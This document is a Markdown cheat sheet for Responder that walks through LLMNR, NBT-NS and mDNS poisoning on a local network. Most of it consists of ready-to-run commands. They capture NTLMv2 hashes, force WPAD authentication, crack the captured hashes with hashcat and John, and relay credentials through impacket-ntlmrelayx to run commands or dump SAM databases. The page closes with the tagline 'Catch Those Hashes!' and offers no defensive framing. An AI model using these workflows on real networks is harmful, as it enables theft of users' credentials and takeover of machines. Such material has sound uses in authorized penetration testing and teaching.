# 🎣 Responder - LLMNR/NBT-NS Poisoning

```
  ██████╗ ███████╗███████╗██████╗  ██████╗ ███╗   ██╗██████╗ ███████╗██████╗ 
  ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██╔════╝██╔══██╗
  ██████╔╝█████╗  ███████╗██████╔╝██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
  ██╔══██╗██╔══╝  ╚════██║██╔═══╝ ██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
  ██║  ██║███████╗███████║██║     ╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║
  ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
               LLMNR/NBT-NS/mDNS Poisoner
```

<p align="center">
  <img src="https://img.shields.io/badge/Responder-NTLM_Capture-red?style=for-the-badge" alt="Responder">
  <img src="https://img.shields.io/badge/LLMNR-Poisoning-blue?style=for-the-badge" alt="LLMNR">
</p>

---

## 📋 Table of Contents

- [What is Responder](#-what-is-responder)
- [Installation](#-installation)
- [Basic Usage](#-basic-usage)
- [Capture NTLMv2 Hashes](#-capture-ntlmv2-hashes)
- [Relay Attacks](#-relay-attacks)
- [Rogue Servers](#-rogue-servers)
- [Configuration](#-configuration)
- [Quick Reference](#-quick-reference)

---

## 🎯 What is Responder

**Responder** poisons LLMNR, NBT-NS, and mDNS responses to capture NTLM hashes:

- 🎣 **LLMNR Poisoning** - Link-Local Multicast Name Resolution
- 📡 **NBT-NS Poisoning** - NetBIOS Name Service
- 🍎 **mDNS Poisoning** - Multicast DNS
- 🔓 **Hash Capture** - NTLMv1/NTLMv2 hashes
- 🔄 **Relay Support** - NTLM relay attacks

### How It Works

```
1. User types wrong hostname: \\fileservr (typo)
2. DNS fails to resolve
3. Windows broadcasts LLMNR/NBT-NS query
4. Responder answers: "I'm fileservr!"
5. Victim sends NTLM hash to authenticate
6. Hash captured for cracking/relay
```

---

## 🚀 Installation

### Kali Linux

```bash
# Pre-installed
responder --help

# Update
sudo apt update && sudo apt install responder

# Or from GitHub
git clone https://github.com/lgandx/Responder.git
cd Responder
python Responder.py --help
```

### Verify

```bash
responder --help
responder -I eth0 --version
```

---

## 💻 Basic Usage

### Start Responder

```bash
# Basic (capture hashes)
sudo responder -I eth0

# Verbose
sudo responder -I eth0 -v

# Analyze mode (passive)
sudo responder -I eth0 -A
```

### Interface Selection

```bash
# Ethernet
sudo responder -I eth0

# Wireless
sudo responder -I wlan0

# List interfaces
ip a
```

---

## 🔓 Capture NTLMv2 Hashes

### Basic Capture

```bash
# Start Responder
sudo responder -I eth0

# Wait for victims...
# Output:
[+] Listening for events...
[HTTP] NTLMv2 Client   : 192.168.1.100
[HTTP] NTLMv2 Username : DOMAIN\user
[HTTP] NTLMv2 Hash     : user::DOMAIN:1122334455667788:...
```

### Force NTLMv2

```bash
# NTLMv2 only (recommended for cracking)
sudo responder -I eth0 --lm
```

### WPAD Capture

```bash
# Enable WPAD proxy
sudo responder -I eth0 -w

# Force WPAD auth
sudo responder -I eth0 -wF
```

### Hash Locations

```bash
# Captured hashes saved to:
/usr/share/responder/logs/
# Or
./logs/

# Files:
Responder-Session.log
SMB-NTLMv2-*.txt
HTTP-NTLMv2-*.txt
```

### Crack Captured Hashes

```bash
# NTLMv2 format:
# user::DOMAIN:ServerChallenge:NTProofStr:NTLMv2Response

# Hashcat (mode 5600)
hashcat -m 5600 hash.txt wordlist.txt

# John
john --format=netntlmv2 hash.txt
```

---

## 🔄 Relay Attacks

### Disable SMB/HTTP (for relay)

```bash
# Edit Responder.conf
sudo nano /usr/share/responder/Responder.conf

# Set:
SMB = Off
HTTP = Off
```

### Responder + ntlmrelayx

```bash
# Terminal 1: Responder (without SMB/HTTP)
sudo responder -I eth0

# Terminal 2: ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# Or with command execution
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

### Relay to LDAP

```bash
# Responder
sudo responder -I eth0

# Relay to LDAP
impacket-ntlmrelayx -t ldap://DC01.domain.local
```

### Relay for SAM Dump

```bash
# Dump SAM on relay
impacket-ntlmrelayx -tf targets.txt -smb2support --sam
```

---

## 🖥️ Rogue Servers

### Built-in Servers

| Server | Port | Purpose |
|--------|------|---------|
| SMB | 445 | File share auth |
| HTTP | 80 | Web auth |
| HTTPS | 443 | Secure web |
| FTP | 21 | FTP auth |
| SQL | 1433 | MSSQL auth |
| LDAP | 389 | Directory auth |
| WPAD | 80 | Proxy config |

### Enable/Disable Servers

```bash
# Edit Responder.conf
[Responder Core]
; Servers to start
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
```

### WPAD Rogue Proxy

```bash
# Enable WPAD
sudo responder -I eth0 -w

# Force basic auth on WPAD
sudo responder -I eth0 -wF

# Custom WPAD script
sudo responder -I eth0 -w --wpad-name wpad.dat
```

### DNS Spoofing

```bash
# Enable DNS
sudo responder -I eth0 -d

# Responder becomes DNS server
# Answers queries for all hosts
```

---

## ⚙️ Configuration

### Responder.conf

```bash
# Location
/usr/share/responder/Responder.conf
# Or
./Responder.conf
```

### Key Settings

```ini
[Responder Core]
; Set to On or Off
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On

; Custom challenge (for rainbow tables)
Challenge = Random

; Don't respond to local queries
DontRespondTo =

; Only respond to these IPs
RespondTo =
```

### Static Challenge (Rainbow Tables)

```ini
; Set static challenge for precomputed tables
Challenge = 1122334455667788
```

### Exclusions

```ini
; Don't respond to these IPs
DontRespondTo = 192.168.1.1, 192.168.1.2

; Only respond to these
RespondTo = 192.168.1.100, 192.168.1.101
```

---

## 📊 Quick Reference

### Essential Commands

| Command | Description |
|---------|-------------|
| `responder -I eth0` | Basic capture |
| `responder -I eth0 -v` | Verbose mode |
| `responder -I eth0 -A` | Analyze only |
| `responder -I eth0 -w` | Enable WPAD |
| `responder -I eth0 -wF` | Force WPAD auth |
| `responder -I eth0 -d` | Enable DNS |

### Flags

| Flag | Description |
|------|-------------|
| `-I` | Interface |
| `-v` | Verbose |
| `-A` | Analyze mode (passive) |
| `-w` | Enable WPAD |
| `-wF` | Force WPAD auth |
| `-d` | Enable DNS |
| `-f` | Fingerprint hosts |
| `-b` | Return basic auth |

### Hash Types

| Type | Hashcat Mode | John Format |
|------|--------------|-------------|
| NTLMv1 | 5500 | netntlm |
| NTLMv2 | 5600 | netntlmv2 |

### Attack Workflow

```bash
# 1. Start Responder
sudo responder -I eth0 -wFv

# 2. Wait for hashes
# Hashes saved to ./logs/

# 3. Crack hashes
hashcat -m 5600 ./logs/*NTLM*.txt rockyou.txt

# 4. Or relay (disable SMB first)
sudo responder -I eth0  # SMB=Off in config
impacket-ntlmrelayx -tf targets.txt -smb2support
```

### Relay Workflow

```bash
# 1. Find targets without SMB signing
cme smb 10.10.10.0/24 --gen-relay-list relay.txt

# 2. Configure Responder.conf
# SMB = Off
# HTTP = Off

# 3. Start Responder
sudo responder -I eth0

# 4. Start relay
impacket-ntlmrelayx -tf relay.txt -smb2support

# 5. Wait for relayed authentication
```

---

## 📚 Resources

- [Responder GitHub](https://github.com/lgandx/Responder)
- [LLMNR Poisoning](https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/)
- [ntlmrelayx](https://github.com/fortra/impacket)

### Related Cheatsheets
- [Impacket](../Impacket/README.md)
- [CrackMapExec](../CrackMapExec/README.md)
- [Hashcat](../Hashcat/README.md)

---

<p align="center">
  <b>🎣 Catch Those Hashes!</b><br>
  <i>Responder - The network credential harvester</i>
</p>
